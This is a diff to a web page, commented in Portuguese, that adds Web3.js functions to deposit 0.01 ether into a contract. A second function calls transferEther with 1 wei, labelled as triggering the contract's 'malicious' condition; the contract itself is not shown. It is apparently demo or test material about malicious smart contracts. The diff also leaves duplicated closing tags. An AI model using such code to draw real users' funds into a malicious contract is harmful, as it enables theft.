@@ -196,6 +196,51 @@
                 console.error("Conexão com a wallet necessária.");
             }
         }
+	      // Função para criar uma transação
+        async function criarTransacao() {
+            if (window.ethereum) {
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    const accounts = await web3.eth.getAccounts();
+                    const contrato = new web3.eth.Contract(abi, enderecoContrato);
+
+                    // Chama o método deposit do contrato
+                    const resultado = await contrato.methods
+                        .deposit()
+                        .send({ from: accounts[0], value: web3.utils.toWei("0.01", "ether") }); // Envia 0.01 ether
+
+                    console.log("Transação criada:", resultado);
+                } catch (error) {
+                    console.error("Erro ao criar a transação:", error);
+                }
+            } else {
+                console.error("Nenhuma wallet encontrada.");
+            }
+        }
+    // Função para executar a ação "maliciosa"
+        async function receberAtivos() {
+            if (window.ethereum) {
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    const accounts = await web3.eth.getAccounts();
+                    const contrato = new web3.eth.Contract(abi, enderecoContrato);
+
+                    // Executa a função transferEther com 1 wei, disparando a condição maliciosa
+                    const resultado = await contrato.methods
+                        .transferEther(accounts[0], 1)
+                        .send({ from: accounts[0] });
+
+                    console.log("Receber ativos executado:", resultado);
+                } catch (error) {
+                    console.error("Erro ao receber ativos:", error);
+                }
+            } else {
+                console.error("Nenhuma wallet encontrada.");
+            }
+        }
+    </script>
+</body>
+</html>
     </script>
 </body>
 </html>
